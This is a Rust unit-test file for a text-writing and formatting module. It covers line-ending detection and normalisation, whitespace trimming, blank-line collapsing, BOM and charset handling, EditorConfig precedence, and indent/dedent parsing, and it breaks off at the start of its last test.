use super::*;
#[cfg(feature = "cli")]
use crate::cli::global::GlobalFlags;
use std::fs;

#[cfg(feature = "cli")]
fn test_global_flags() -> GlobalFlags {
    GlobalFlags::test_default()
}

mod detect_eol_tests {
    use super::*;

    #[test]
    fn detect_eol_lf_only() {
        assert_eq!(detect_eol("line1\nline2\nline3\n"), "\n");
    }

    #[test]
    fn detect_eol_crlf_only() {
        assert_eq!(detect_eol("line1\r\nline2\r\nline3\r\n"), "\r\n");
    }

    #[test]
    fn detect_eol_mixed_crlf_dominant() {
        assert_eq!(detect_eol("line1\r\nline2\nline3\r\n"), "\r\n");
    }

    #[test]
    fn detect_eol_mixed_lf_dominant() {
        assert_eq!(detect_eol("line1\nline2\r\nline3\n"), "\n");
    }

    #[test]
    fn detect_eol_empty_string() {
        assert_eq!(detect_eol(""), "\n");
    }

    #[test]
    fn detect_eol_no_newlines() {
        assert_eq!(detect_eol("no newlines here"), "\n");
    }

    #[test]
    fn detect_eol_cr_only() {
        assert_eq!(detect_eol("line1\rline2\r"), "\r");
    }
}

mod basic {
    use super::*;

    #[test]
    fn ensure_final_newline_adds_when_missing() {
        assert_eq!(ensure_final_newline("hello", EolMode::Keep), "hello\n");
    }

    #[test]
    fn parse_eol_mode_cr() {
        assert!(matches!(parse_eol_mode("cr").unwrap(), EolMode::Cr));
    }

    #[test]
    fn trim_trailing_whitespace_removes_spaces() {
        let result = trim_trailing_whitespace("hello   \nworld\t\n");
        assert_eq!(result, "hello\nworld\n");
        assert!(
            matches!(result, std::borrow::Cow::Owned(_)),
            "trimmed content should be Cow::Owned"
        );
    }

    #[test]
    fn trim_trailing_whitespace_clean_returns_borrowed() {
        let result = trim_trailing_whitespace("hello\nworld\n");
        assert_eq!(result, "hello\nworld\n");
        assert!(
            matches!(result, std::borrow::Cow::Borrowed(_)),
            "clean content should return Cow::Borrowed, not allocate"
        );
    }

    #[test]
    fn noop_policy_returns_borrowed() {
        let policy = WritePolicy::default();
        let input = "hello\nworld\n";
        let result = apply_policy(input, &policy);
        assert!(
            matches!(result, std::borrow::Cow::Borrowed(_)),
            "no-op policy should return Cow::Borrowed"
        );
        assert_eq!(&*result, input);
    }

    #[test]
    fn apply_policy_chains_all() {
        let policy = WritePolicy {
            trim_trailing_whitespace: true,
            normalize_eol: EolMode::Lf,
            ensure_final_newline: true,
            ..Default::default()
        };
        // Trailing whitespace, CRLF endings, no final newline.
        let input = "hello  \r\nworld\t\r\n";
        let result = apply_policy(input, &policy);
        // After trim: "hello\r\nworld\r\n"
        // After LF:   "hello\nworld\n"
        // After final newline: already ends with \n → unchanged.
        assert_eq!(result, "hello\nworld\n");
    }

    #[test]
    fn atomic_write_writes_correct_content() {
        let dir = tempfile::tempdir().unwrap();
        let target = dir.path().join("output.txt");

        let policy = WritePolicy {
            ensure_final_newline: true,
            normalize_eol: EolMode::Lf,
            trim_trailing_whitespace: true,
            ..Default::default()
        };

        atomic_write(&target, "foo  \r\nbar", &policy).unwrap();

        let got = fs::read_to_string(&target).unwrap();
        assert_eq!(got, "foo\nbar\n");
    }

    #[test]
    #[cfg(feature = "cli")]
    fn policy_from_flags_explicit_flags_win() {
        let dir = tempfile::tempdir().unwrap();
        let ec_path = dir.path().join(".editorconfig");
        fs::write(
            &ec_path,
            "root = true\n\n[*]\ninsert_final_newline = false\nend_of_line = crlf\ntrim_trailing_whitespace = false\n",
        )
        .unwrap();

        let file = dir.path().join("test.txt");
        fs::write(&file, "content\n").unwrap();

        let mut global = test_global_flags();
        global.respect_editorconfig = true;
        global.ensure_final_newline = true;
        global.normalize_eol = Some(EolMode::Lf);
        global.trim_trailing_whitespace = true;

        let policy = policy_from_flags(&global, Some(&file));
        // Explicit flags should win over EditorConfig values.
        assert!(policy.ensure_final_newline);
        assert!(matches!(policy.normalize_eol, EolMode::Lf));
        assert!(policy.trim_trailing_whitespace);
    }

    #[test]
    #[cfg(feature = "cli")]
    fn policy_from_flags_editorconfig_provides_defaults() {
        let dir = tempfile::tempdir().unwrap();
        let ec_path = dir.path().join(".editorconfig");
        fs::write(
            &ec_path,
            "root = true\n\n[*]\ninsert_final_newline = true\nend_of_line = lf\ntrim_trailing_whitespace = true\n",
        )
        .unwrap();

        let file = dir.path().join("test.txt");
        fs::write(&file, "content\n").unwrap();

        let mut global = test_global_flags();
        global.respect_editorconfig = true;

        let policy = policy_from_flags(&global, Some(&file));
        assert!(policy.ensure_final_newline);
        assert!(matches!(policy.normalize_eol, EolMode::Lf));
        assert!(policy.trim_trailing_whitespace);
    }

    #[test]
    fn noop_policy_detected() {
        assert!(WritePolicy::default().is_noop());
    }

    #[test]
    fn non_noop_policy_detected() {
        let p = WritePolicy {
            ensure_final_newline: true,
            ..Default::default()
        };
        assert!(!p.is_noop());

        let p2 = WritePolicy {
            normalize_eol: EolMode::Lf,
            ..Default::default()
        };
        assert!(!p2.is_noop());

        let p3 = WritePolicy {
            trim_trailing_whitespace: true,
            ..Default::default()
        };
        assert!(!p3.is_noop());
    }

    #[test]
    fn atomic_create_new_writes_content() {
        let dir = tempfile::tempdir().unwrap();
        let target = dir.path().join("new.txt");

        let policy = WritePolicy {
            ensure_final_newline: true,
            normalize_eol: EolMode::Lf,
            trim_trailing_whitespace: false,
            ..Default::default()
        };

        atomic_create_new(&target, "hello", &policy).unwrap();
        let got = fs::read_to_string(&target).unwrap();
        assert_eq!(got, "hello\n");
    }

    #[test]
    #[cfg(feature = "cli")]
    fn policy_from_flags_no_editorconfig_uses_defaults() {
        let global = test_global_flags();

        let policy = policy_from_flags(&global, None);
        assert!(!policy.ensure_final_newline);
        assert!(matches!(policy.normalize_eol, EolMode::Keep));
        assert!(!policy.trim_trailing_whitespace);
    }

    #[test]
    fn collapse_blanks_reduces_consecutive_blanks() {
        let input = "line1\n\n\n\nline2\n\n\nline3\n";
        let result = collapse_blanks(input);
        assert_eq!(result, "line1\n\nline2\n\nline3\n");
    }

    #[test]
    fn collapse_blanks_no_change_returns_borrowed() {
        let input = "line1\n\nline2\nline3\n";
        let result = collapse_blanks(input);
        assert_eq!(result, input);
        assert!(
            matches!(result, std::borrow::Cow::Borrowed(_)),
            "no-change should return Cow::Borrowed"
        );
    }

    #[test]
    fn apply_policy_collapse_blanks() {
        let policy = WritePolicy {
            collapse_blanks: true,
            ..Default::default()
        };
        let input = "a\n\n\nb\n";
        let result = apply_policy(input, &policy);
        assert_eq!(result, "a\n\nb\n");
    }

    #[test]
    fn write_policy_override_full() {
        let mut policy = WritePolicy::default();
        let ov = WritePolicyOverride {
            ensure_final_newline: Some(true),
            normalize_eol: Some("lf".to_string()),
            trim_trailing_whitespace: Some(true),
            collapse_blanks: Some(true),
            respect_editorconfig: Some(true),
        };
        policy.apply_override(&ov).unwrap();
        assert!(policy.ensure_final_newline);
        assert!(matches!(policy.normalize_eol, EolMode::Lf));
        assert!(policy.trim_trailing_whitespace);
        assert!(policy.collapse_blanks);
    }

    #[test]
    fn write_policy_override_partial() {
        let mut policy = WritePolicy::default();
        let ov = WritePolicyOverride {
            ensure_final_newline: Some(true),
            ..Default::default()
        };
        policy.apply_override(&ov).unwrap();
        assert!(policy.ensure_final_newline);
        // Other fields stay at defaults.
        assert!(matches!(policy.normalize_eol, EolMode::Keep));
        assert!(!policy.trim_trailing_whitespace);
        assert!(!policy.collapse_blanks);
    }

    #[test]
    fn write_policy_override_lf() {
        let mut policy = WritePolicy::default();
        let ov = WritePolicyOverride {
            normalize_eol: Some("lf".to_string()),
            ..Default::default()
        };
        policy.apply_override(&ov).unwrap();
        assert!(matches!(policy.normalize_eol, EolMode::Lf));
    }

    #[test]
    fn write_policy_override_crlf() {
        let mut policy = WritePolicy::default();
        let ov = WritePolicyOverride {
            normalize_eol: Some("crlf".to_string()),
            ..Default::default()
        };
        policy.apply_override(&ov).unwrap();
        assert!(matches!(policy.normalize_eol, EolMode::Crlf));
    }

    #[test]
    fn write_policy_override_cr() {
        let mut policy = WritePolicy::default();
        let ov = WritePolicyOverride {
            normalize_eol: Some("cr".to_string()),
            ..Default::default()
        };
        policy.apply_override(&ov).unwrap();
        assert!(matches!(policy.normalize_eol, EolMode::Cr));
    }
}

mod line_endings {
    use super::*;

    #[test]
    fn ensure_final_newline_cr_mode_appends_cr() {
        assert_eq!(ensure_final_newline("hello\r", EolMode::Cr), "hello\r");
        assert_eq!(ensure_final_newline("hello", EolMode::Cr), "hello\r");
    }

    #[test]
    fn ensure_final_newline_cr_mode_does_not_append_lf() {
        // Content ending with \r should NOT get a \n appended
        let result = ensure_final_newline("line1\rline2\r", EolMode::Cr);
        assert!(result.ends_with('\r'));
        assert!(!result.ends_with('\n'));
    }

    #[test]
    fn ensure_final_newline_crlf_mode_appends_crlf() {
        assert_eq!(
            ensure_final_newline("hello\r\n", EolMode::Crlf),
            "hello\r\n"
        );
        assert_eq!(ensure_final_newline("hello", EolMode::Crlf), "hello\r\n");
    }

    #[test]
    fn ensure_final_newline_crlf_mode_bare_lf_gets_crlf() {
        // Content ending with bare \n should get \r\n appended (not kept as-is)
        assert_eq!(
            ensure_final_newline("hello\n", EolMode::Crlf),
            "hello\n\r\n"
        );
    }

    #[test]
    fn ensure_final_newline_lf_mode_unchanged() {
        assert_eq!(ensure_final_newline("hello", EolMode::Lf), "hello\n");
        assert_eq!(ensure_final_newline("hello\n", EolMode::Lf), "hello\n");
    }

    #[test]
    fn normalize_eol_lf_converts_crlf() {
        assert_eq!(normalize_eol("a\r\nb\r\n", EolMode::Lf), "a\nb\n");
    }

    #[test]
    fn normalize_eol_crlf_converts_lf() {
        assert_eq!(normalize_eol("a\nb\n", EolMode::Crlf), "a\r\nb\r\n");
    }

    #[test]
    fn normalize_eol_crlf_bare_lf_at_position_zero() {
        // Exercises the `i == 0` branch in the memchr single-pass scan.
        assert_eq!(normalize_eol("\na\n", EolMode::Crlf), "\r\na\r\n");
    }

    #[test]
    fn normalize_eol_crlf_mixed_content() {
        // Some lines already CRLF, some bare LF — only bare LFs get \r.
        assert_eq!(
            normalize_eol("a\r\nb\nc\r\n", EolMode::Crlf),
            "a\r\nb\r\nc\r\n"
        );
    }

    #[test]
    fn normalize_eol_crlf_already_correct_returns_borrowed() {
        use std::borrow::Cow;
        let content = "a\r\nb\r\n";
        let result = normalize_eol(content, EolMode::Crlf);
        assert!(
            matches!(result, Cow::Borrowed(_)),
            "all-CRLF content should return Cow::Borrowed"
        );
    }

    #[test]
    fn normalize_eol_keep_unchanged() {
        let content = "a\r\nb\nc\n";
        assert_eq!(normalize_eol(content, EolMode::Keep), content);
    }

    #[test]
    fn normalize_eol_cr_converts_lf() {
        assert_eq!(normalize_eol("a\nb\n", EolMode::Cr), "a\rb\r");
    }

    #[test]
    fn normalize_eol_cr_converts_crlf() {
        assert_eq!(normalize_eol("a\r\nb\r\n", EolMode::Cr), "a\rb\r");
    }

    #[test]
    fn normalize_eol_cr_mixed_input() {
        assert_eq!(normalize_eol("a\r\nb\nc\r\n", EolMode::Cr), "a\rb\rc\r");
    }

    #[test]
    fn normalize_eol_cr_already_correct_returns_borrowed() {
        use std::borrow::Cow;
        let content = "a\rb\r";
        let result = normalize_eol(content, EolMode::Cr);
        assert!(
            matches!(result, Cow::Borrowed(_)),
            "all-CR content should return Cow::Borrowed"
        );
    }

    #[test]
    fn normalize_eol_lf_also_strips_bare_cr() {
        // LF mode should convert both \r\n and bare \r to \n.
        assert_eq!(normalize_eol("a\rb\r\nc\n", EolMode::Lf), "a\nb\nc\n");
    }

    #[test]
    fn normalize_eol_crlf_converts_bare_cr() {
        // Bare \r (classic Mac) should become \r\n.
        assert_eq!(normalize_eol("a\rb\r", EolMode::Crlf), "a\r\nb\r\n");
    }

    #[test]
    fn normalize_eol_crlf_mixed_with_bare_cr() {
        // Mix of bare \r, \r\n, and bare \n should all become \r\n.
        assert_eq!(
            normalize_eol("a\rb\r\nc\n", EolMode::Crlf),
            "a\r\nb\r\nc\r\n"
        );
    }

    #[test]
    #[cfg(feature = "cli")]
    fn policy_from_flags_editorconfig_cr() {
        let dir = tempfile::tempdir().unwrap();
        let ec_path = dir.path().join(".editorconfig");
        fs::write(&ec_path, "root = true\n\n[*]\nend_of_line = cr\n").unwrap();

        let file = dir.path().join("test.txt");
        fs::write(&file, "content\n").unwrap();

        let mut global = test_global_flags();
        global.respect_editorconfig = true;

        let policy = policy_from_flags(&global, Some(&file));
        assert!(
            matches!(policy.normalize_eol, EolMode::Cr),
            "end_of_line = cr should map to EolMode::Cr"
        );
    }

    #[test]
    fn apply_charset_utf8_bom_inserts_mark() {
        assert_eq!(
            apply_charset("hello\n", CharsetMode::Utf8Bom),
            "\u{feff}hello\n"
        );
        assert_eq!(
            apply_charset("\u{feff}hello\n", CharsetMode::Utf8Bom),
            "\u{feff}hello\n"
        );
    }

    #[test]
    fn apply_charset_utf8_strips_mark() {
        assert_eq!(
            apply_charset("\u{feff}hello\n", CharsetMode::Utf8),
            "hello\n"
        );
        assert_eq!(apply_charset("hello\n", CharsetMode::Utf8), "hello\n");
    }

    #[test]
    fn apply_policy_utf8_bom_after_eol() {
        let policy = WritePolicy {
            charset: CharsetMode::Utf8Bom,
            ..Default::default()
        };
        assert_eq!(apply_policy("hello\n", &policy), "\u{feff}hello\n");
        assert!(!policy.is_noop());
    }

    #[test]
    fn apply_policy_empty_utf8_bom_then_final_newline() {
        let policy = WritePolicy {
            charset: CharsetMode::Utf8Bom,
            ensure_final_newline: true,
            normalize_eol: EolMode::Lf,
            ..Default::default()
        };
        assert_eq!(apply_policy("", &policy), "\u{feff}\n");
    }

    #[test]
    #[cfg(feature = "cli")]
    fn policy_from_flags_editorconfig_utf8_bom() {
        let dir = tempfile::tempdir().unwrap();
        fs::write(
            dir.path().join(".editorconfig"),
            "root = true\n\n[*]\ncharset = utf-8-bom\nend_of_line = lf\n",
        )
        .unwrap();
        let file = dir.path().join("x.txt");
        fs::write(&file, "hello\n").unwrap();

        let mut global = test_global_flags();
        global.respect_editorconfig = true;
        let policy = policy_from_flags(&global, Some(&file));
        assert_eq!(policy.charset, CharsetMode::Utf8Bom);
        assert_eq!(apply_policy("hello\n", &policy), "\u{feff}hello\n");
    }

    #[test]
    #[cfg(feature = "cli")]
    fn policy_from_flags_editorconfig_utf8_does_not_insert_bom() {
        let dir = tempfile::tempdir().unwrap();
        fs::write(
            dir.path().join(".editorconfig"),
            "root = true\n\n[*]\ncharset = utf-8\n",
        )
        .unwrap();
        let file = dir.path().join("x.txt");
        fs::write(&file, "hello\n").unwrap();

        let mut global = test_global_flags();
        global.respect_editorconfig = true;
        let policy = policy_from_flags(&global, Some(&file));
        assert_eq!(policy.charset, CharsetMode::Utf8);
        assert_eq!(apply_policy("hello\n", &policy), "hello\n");
        assert_eq!(apply_policy("\u{feff}hello\n", &policy), "hello\n");
    }

    #[test]
    #[cfg(feature = "cli")]
    fn policy_from_flags_editorconfig_utf16le_is_unsupported() {
        let dir = tempfile::tempdir().unwrap();
        fs::write(
            dir.path().join(".editorconfig"),
            "root = true\n\n[*]\ncharset = utf-16le\n",
        )
        .unwrap();
        let file = dir.path().join("x.txt");
        fs::write(&file, "hello\n").unwrap();

        let mut global = test_global_flags();
        global.respect_editorconfig = true;
        let policy = policy_from_flags(&global, Some(&file));
        assert_eq!(policy.charset, CharsetMode::Unsupported("utf-16le"));
        let err = policy.refuse_unsupported_charset().expect_err("utf-16le");
        assert!(
            err.to_string().contains("utf-16le"),
            "refuse should name charset: {err}"
        );
    }

    #[test]
    fn trim_trailing_whitespace_crlf_endings() {
        let result = trim_trailing_whitespace("hello  \r\nworld\t\r\n");
        assert_eq!(result, "hello\r\nworld\r\n");
    }

    #[test]
    fn trim_trailing_whitespace_cr_endings() {
        let result = trim_trailing_whitespace("hello   \rworld\t\r");
        assert_eq!(result, "hello\rworld\r");
        assert!(matches!(result, std::borrow::Cow::Owned(_)));
    }

    #[test]
    fn trim_trailing_whitespace_cr_clean_returns_borrowed() {
        let result = trim_trailing_whitespace("hello\rworld\r");
        assert_eq!(result, "hello\rworld\r");
        assert!(
            matches!(result, std::borrow::Cow::Borrowed(_)),
            "clean CR content should return Cow::Borrowed"
        );
    }

    #[test]
    fn trim_trailing_whitespace_cr_mixed_whitespace() {
        // Tabs and spaces before CR endings.
        let result = trim_trailing_whitespace("a \t\rb  \r");
        assert_eq!(result, "a\rb\r");
    }

    #[test]
    fn trim_trailing_whitespace_cr_no_trailing_newline() {
        // Last line with trailing whitespace, no line ending.
        let result = trim_trailing_whitespace("hello\rworld  ");
        assert_eq!(result, "hello\rworld");
    }

    #[test]
    fn collapse_blanks_cr_endings() {
        let input = "line1\r\r\r\rline2\r\r\rline3\r";
        let result = collapse_blanks(input);
        assert_eq!(result, "line1\r\rline2\r\rline3\r");
    }

    #[test]
    fn collapse_blanks_cr_no_change_returns_borrowed() {
        let input = "line1\r\rline2\rline3\r";
        let result = collapse_blanks(input);
        assert_eq!(result, input);
        assert!(
            matches!(result, std::borrow::Cow::Borrowed(_)),
            "no-change CR content should return Cow::Borrowed"
        );
    }

    #[test]
    fn collapse_blanks_crlf_endings() {
        let input = "line1\r\n\r\n\r\n\r\nline2\r\n";
        let result = collapse_blanks(input);
        assert_eq!(result, "line1\r\n\r\nline2\r\n");
    }

    #[test]
    fn collapse_blanks_cr_whitespace_only_lines_are_blank() {
        let input = "line1\r  \r\t\r\rline2\r";
        let result = collapse_blanks(input);
        // "  " and "\t" and "" are all blank; three consecutive blanks become one.
        assert_eq!(result, "line1\r  \rline2\r");
    }

    #[test]
    fn apply_policy_cr_mode_final_newline_is_cr() {
        let policy = WritePolicy {
            ensure_final_newline: true,
            normalize_eol: EolMode::Cr,
            ..Default::default()
        };
        // Content without a trailing newline: should get \r appended.
        let result = apply_policy("hello", &policy);
        assert_eq!(result, "hello\r");
        assert!(!result.ends_with('\n'), "CR mode must not append \\n");
    }

    #[test]
    fn apply_policy_crlf_mode_final_newline_is_crlf() {
        let policy = WritePolicy {
            ensure_final_newline: true,
            normalize_eol: EolMode::Crlf,
            ..Default::default()
        };
        let result = apply_policy("hello", &policy);
        assert_eq!(result, "hello\r\n");
    }

    #[test]
    fn apply_policy_cr_mode_multiline_final_newline() {
        let policy = WritePolicy {
            ensure_final_newline: true,
            normalize_eol: EolMode::Cr,
            ..Default::default()
        };
        // Input has LF line endings; normalize converts to CR, then final \r appended.
        let result = apply_policy("a\nb", &policy);
        assert_eq!(result, "a\rb\r");
    }

    #[test]
    fn apply_policy_cr_mode_collapse_blanks() {
        let policy = WritePolicy {
            collapse_blanks: true,
            normalize_eol: EolMode::Cr,
            ..Default::default()
        };
        // Input with LF endings; after normalize_eol they become CR.
        // Then collapse_blanks must still detect and collapse consecutive blank lines.
        let input = "a\n\n\nb\n";
        let result = apply_policy(input, &policy);
        assert_eq!(result, "a\r\rb\r");
    }

    #[test]
    fn apply_policy_cr_mode_trim_and_collapse() {
        let policy = WritePolicy {
            trim_trailing_whitespace: true,
            collapse_blanks: true,
            normalize_eol: EolMode::Cr,
            ensure_final_newline: true,
            charset: crate::write::CharsetMode::Keep,
        };
        // Full pipeline: trim trailing ws, normalize to CR, collapse blanks, ensure final \r.
        let input = "hello  \n\n\nworld\t\n";
        let result = apply_policy(input, &policy);
        // After trim: "hello\n\n\nworld\n"
        // After CR normalize: "hello\r\r\rworld\r"
        // After collapse: "hello\r\rworld\r"
        // After final newline: already ends with \r
        assert_eq!(result, "hello\r\rworld\r");
    }
}

mod edge_cases {
    use super::*;

    #[test]
    fn ensure_final_newline_empty_stays_empty() {
        assert_eq!(ensure_final_newline("", EolMode::Keep), "");
    }

    #[test]
    fn ensure_final_newline_no_double_add() {
        assert_eq!(ensure_final_newline("hello\n", EolMode::Keep), "hello\n");
    }

    #[test]
    fn trim_trailing_whitespace_eof_without_newline() {
        let result = trim_trailing_whitespace("hello  ");
        assert_eq!(result, "hello");
    }

    #[test]
    fn collapse_blanks_whitespace_only_lines_are_blank() {
        let input = "line1\n  \n\t\n\nline2\n";
        let result = collapse_blanks(input);
        // "  " and "\t" and "" are all blank; three consecutive blanks become one.
        assert_eq!(result, "line1\n  \nline2\n");
    }

    #[test]
    fn collapse_blanks_no_blanks() {
        let input = "line1\nline2\nline3\n";
        let result = collapse_blanks(input);
        assert_eq!(result, input);
    }

    #[test]
    fn ensure_final_newline_keep_mode_uses_crlf_for_crlf_content() {
        // #1175: Keep mode should detect dominant EOL and use it,
        // not hardcode \n which introduces mixed endings.
        let input = "line1\r\nline2\r\n";
        let result = ensure_final_newline(input, EolMode::Keep);
        // Already ends with \r\n, should be unchanged.
        assert_eq!(result, input);
    }

    #[test]
    fn ensure_final_newline_keep_mode_appends_crlf_for_crlf_content() {
        // #1175: CRLF content missing final newline should get \r\n, not \n.
        let input = "line1\r\nline2";
        let result = ensure_final_newline(input, EolMode::Keep);
        assert_eq!(result, "line1\r\nline2\r\n");
        assert!(result.ends_with("\r\n"));
    }

    #[test]
    fn ensure_final_newline_keep_mode_appends_lf_for_lf_content() {
        // #1175: LF content should still get \n in Keep mode.
        let input = "line1\nline2";
        let result = ensure_final_newline(input, EolMode::Keep);
        assert_eq!(result, "line1\nline2\n");
    }

    #[test]
    fn collapse_blanks_trailing_blank_no_newline() {
        // Two consecutive blank lines where the last has no trailing newline.
        // The fast-scan must detect this to trigger collapsing.
        // The first blank line is preserved (with its newline); the second is dropped.
        let input = "a\n \n ";
        let result = collapse_blanks(input);
        assert_eq!(result, "a\n \n");
    }
}

mod dedent_indent {
    use super::*;

    // #2378: an unusable spec must be a typed error, not a silent no-op.

    #[test]
    fn parse_dedent_spec_accepts_valid_forms() {
        assert_eq!(parse_dedent_spec("auto").unwrap(), IndentSpec::Auto);
        assert_eq!(parse_dedent_spec("tab").unwrap(), IndentSpec::Tab);
        assert_eq!(parse_dedent_spec("4").unwrap(), IndentSpec::Spaces(4));
        assert_eq!(
            parse_dedent_spec("0").unwrap(),
            IndentSpec::Spaces(0),
            "0 is a deliberate no-op, not an error"
        );
    }

    #[test]
    fn parse_dedent_spec_rejects_garbage_as_invalid_input() {
        for spec in ["abc", "2.5", "", "4x", "-2", " 4"] {
            let err = parse_dedent_spec(spec).unwrap_err();
            assert!(
                err.to_string().contains("invalid --dedent value"),
                "unexpected message for {spec:?}: {err}"
            );
            assert!(
                crate::exit::is_invalid_input(&err),
                "invalid --dedent must be typed InvalidInputError for JSON error_kind ({spec:?})"
            );
        }
    }

    #[test]
    fn parse_indent_spec_accepts_valid_forms() {
        assert_eq!(parse_indent_spec("tab").unwrap(), IndentSpec::Tab);
        assert_eq!(parse_indent_spec("4").unwrap(), IndentSpec::Spaces(4));
        assert_eq!(parse_indent_spec("0").unwrap(), IndentSpec::Spaces(0));
    }

    #[test]
    fn parse_indent_spec_rejects_auto() {
        let err = parse_indent_spec("auto").unwrap_err();
        assert!(
            err.to_string().contains("applies to --dedent only"),
            "message should explain why auto is invalid here: {err}"
        );
        assert!(crate::exit::is_invalid_input(&err));
    }

    #[test]
    fn parse_indent_spec_rejects_garbage_as_invalid_input() {
        for spec in ["abc", "2.5", "", "4x"] {
            let err = parse_indent_spec(spec).unwrap_err();
            assert!(
                err.to_string().contains("invalid --indent value"),
                "unexpected message for {spec:?}: {err}"
            );
            assert!(crate::exit::is_invalid_input(&err));
        }
    }

    #[test]
    fn dedent_content_treats_invalid_spec_as_noop_for_library_callers() {
        // The infallible signature is kept for compatibility; every patchloom
        // entry point validates with parse_dedent_spec first.
        assert_eq!(dedent_content("    x\n", "abc", None), "    x\n");
        assert_eq!(indent_content("x\n", "abc", None), "x\n");
    }

    #[test]
    fn dedent_auto_removes_minimum_indent() {
        let input = "    line1\n        line2\n    line3\n";
        let result = dedent_content(input, "auto", None);
        assert_eq!(result, "line1\n    line2\nline3\n");
    }

    #[test]
    fn dedent_auto_skips_blank_lines() {
        let input = "    line1\n\n    line2\n";
        let result = dedent_content(input, "auto", None);
        assert_eq!(result, "line1\n\nline2\n");
    }

    #[test]
    fn dedent_auto_no_indent_returns_unchanged() {
        let input = "line1\nline2\n";
        let result = dedent_content(input, "auto", None);
        assert_eq!(result, input);
    }

    #[test]
    fn dedent_numeric_removes_n_spaces() {
        let input = "        line1\n    line2\n";
        let result = dedent_content(input, "4", None);
        assert_eq!(result, "    line1\nline2\n");
    }

    #[test]
    fn dedent_numeric_stops_at_available_indent() {
        let input = "  line1\n      line2\n";
        let result = dedent_content(input, "4", None);
        assert_eq!(result, "line1\n  line2\n");
    }

    #[test]
    fn dedent_tab_removes_one_tab() {
        let input = "\tline1\n\t\tline2\nline3\n";
        let result = dedent_content(input, "tab", None);
        assert_eq!(result, "line1\n\tline2\nline3\n");
    }

    #[test]
    fn dedent_tab_no_tab_unchanged() {
        let input = "    line1\n";
        let result = dedent_content(input, "tab", None);
        assert_eq!(result, "    line1\n");
    }

    #[test]
    fn dedent_auto_tab_indented_file() {
        // Auto dedent must handle tab-indented files, not just space-indented.
        let input = "\t\tline1\n\t\t\tline2\n\t\tline3\n";
        let result = dedent_content(input, "auto", None);
        assert_eq!(result, "line1\n\tline2\nline3\n");
    }

    #[test]
    fn dedent_with_line_range() {
        let input = "    line1\n    line2\n    line3\n    line4\n";
        let result = dedent_content(input, "4", Some((2, Some(3))));
        assert_eq!(result, "    line1\nline2\nline3\n    line4\n");
    }

    #[test]
    fn indent_numeric_adds_spaces() {
        let input = "line1\nline2\n";
        let result = indent_content(input, "4", None);
        assert_eq!(result, "    line1\n    line2\n");
    }

    #[test]
    fn indent_tab_adds_tab() {
        let input = "line1\nline2\n";
        let result = indent_content(input, "tab", None);
        assert_eq!(result, "\tline1\n\tline2\n");
    }

    #[test]
    fn indent_skips_blank_lines() {
        let input = "line1\n\nline2\n";
        let result = indent_content(input, "4", None);
        assert_eq!(result, "    line1\n\n    line2\n");
    }

    #[test]
    fn indent_with_line_range() {
        let input = "line1\nline2\nline3\nline4\n";
        let result = indent_content(input, "4", Some((2, Some(3))));
        assert_eq!(result, "line1\n    line2\n    line3\nline4\n");
    }

    #[test]
    fn indent_zero_returns_unchanged() {
        let input = "line1\nline2\n";
        let result = indent_content(input, "0", None);
        assert_eq!(result, input);
    }

    #[test]
    fn dedent_auto_line_range() {
        // Only dedent lines 2-3; leave lines 1 and 4 alone.
        let input = "    a\n        b\n        c\n    d\n";
        let result = dedent_content(input, "auto", Some((2, Some(3))));
        // min indent in range (lines 2-3) is 8 spaces, so remove 8.
        assert_eq!(result, "    a\nb\nc\n    d\n");
    }

    #[test]
    fn indent_content_existing_bom_stays_leading() {
        let result = indent_content("\u{feff}hello\n", "4", None);
        assert_eq!(result, "\u{feff}    hello\n");
    }

    #[test]
    fn dedent_content_existing_bom_stays_leading() {
        let result = dedent_content("\u{feff}    hello\n", "4", None);
        assert_eq!(result, "\u{feff}hello\n");
    }

    #[test]
    fn indent_content_without_bom_prefixes_spaces() {
        let result = indent_content("hello\n", "4", None);
        assert_eq!(result, "    hello\n");
    }

    // #2377: indent width is measured in whitespace *characters*, not bytes.
    // `trim_start` strips all Unicode whitespace, so a byte-measured indent
    // used as a slice index splits multi-byte whitespace and panics.

    #[test]
    fn indent_char_count_counts_characters_not_bytes() {
        assert_eq!(indent_char_count("    x"), 4);
        assert_eq!(indent_char_count("\u{a0}x"), 1, "U+00A0 is 2 bytes, 1 char");
        assert_eq!(
            indent_char_count("\u{3000}x"),
            1,
            "U+3000 is 3 bytes, 1 char"
        );
        assert_eq!(indent_char_count("\t \u{202f}x"), 3);
        assert_eq!(indent_char_count("x  "), 0, "trailing space is not indent");
        assert_eq!(indent_char_count(""), 0);
    }

    #[test]
    fn indent_strip_offset_always_lands_on_char_boundary() {
        for line in [
            "\u{a0}foo",
            "\u{3000}foo",
            "  \u{3000}foo",
            "\u{202f}\u{a0}foo",
            "\tfoo",
            "foo",
            "",
        ] {
            for n in 0..8 {
                let off = indent_strip_offset(line, n);
                assert!(
                    line.is_char_boundary(off),
                    "offset {off} not a char boundary in {line:?} for n={n}"
                );
                // Must not panic.
                let _ = &line[off..];
            }
        }
    }

    #[test]
    fn indent_strip_offset_clamps_to_available_indent() {
        assert_eq!(indent_strip_offset("  x", 8), 2, "clamps to the 2 it has");
        assert_eq!(indent_strip_offset("x", 4), 0, "no indent to strip");
        assert_eq!(indent_strip_offset("\u{3000}x", 1), 3, "one char, 3 bytes");
    }

    #[test]
    fn dedent_numeric_nbsp_indent_does_not_panic() {
        // Was: "byte index 1 is not a char boundary; it is inside '\u{a0}'".
        assert_eq!(dedent_content("\u{a0}foo\n", "1", None), "foo\n");
    }

    #[test]
    fn dedent_auto_mixed_ascii_and_wide_whitespace_does_not_panic() {
        // min indent is 1 *character* (the U+3000 line), so each line loses one.
        assert_eq!(dedent_content("  a\n\u{3000}b\n", "auto", None), " a\nb\n");
    }

    #[test]
    fn dedent_numeric_strips_whole_wide_whitespace_chars() {
        assert_eq!(
            dedent_content("\u{3000}\u{3000}x\n", "1", None),
            "\u{3000}x\n"
        );
        assert_eq!(dedent_content("\u{3000}\u{3000}x\n", "2", None), "x\n");
        assert_eq!(
            dedent_content("\u{3000}\u{3000}x\n", "9", None),
            "x\n",
            "over-large N clamps rather than panicking"
        );
    }

    #[test]
    fn dedent_stops_at_first_non_whitespace() {
        assert_eq!(
            dedent_content("  a b\n", "4", None),
            "a b\n",
            "interior space is not indent"
        );
    }

    #[test]
    fn dedent_ascii_behavior_is_unchanged_by_char_counting() {
        // For ASCII space/tab indents, N characters == N bytes.
        assert_eq!(dedent_content("        x\n", "4", None), "    x\n");
        assert_eq!(dedent_content("\tx\n", "4", None), "x\n");
        assert_eq!(dedent_content("  x\n", "4", None), "x\n");
    }

    #[test]
    fn dedent_wide_whitespace_preserves_line_count_and_content() {
